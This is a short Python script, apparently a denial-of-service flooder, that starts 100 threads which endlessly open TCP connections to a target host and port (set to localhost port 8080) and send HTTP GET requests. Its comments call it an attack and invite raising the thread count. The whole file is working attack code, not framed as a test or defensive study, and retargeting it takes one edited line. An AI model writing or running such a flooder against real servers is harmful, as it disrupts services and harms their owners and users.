import socket
import threading
import time

# Target information
target = "127.0.0.1"  # Localhost IP
port = 8080  # Port where the server is running


# Attack function
def attack():
    while True:
        try:
            # Create a new socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)  # Set a timeout to avoid indefinite hangs

            # Connect to the target
            s.connect((target, port))

            # Send a basic HTTP GET request
            s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")

            # Simulate keeping the connection alive (like a slow attack)
            time.sleep(0.1)  # Introduce a slight delay to observe server behavior
            s.close()
        except Exception as e:
            # Print exception for debugging (optional)
            # print(f"Error: {e}")
            pass


# Create multiple threads to simulate high traffic
for i in range(100):  # Adjust the number of threads for the attack
    thread = threading.Thread(target=attack)
    thread.daemon = True  # Allow threads to close when the main program exits
    thread.start()

# Keep the main thread running
while True:
    time.sleep(0.1)

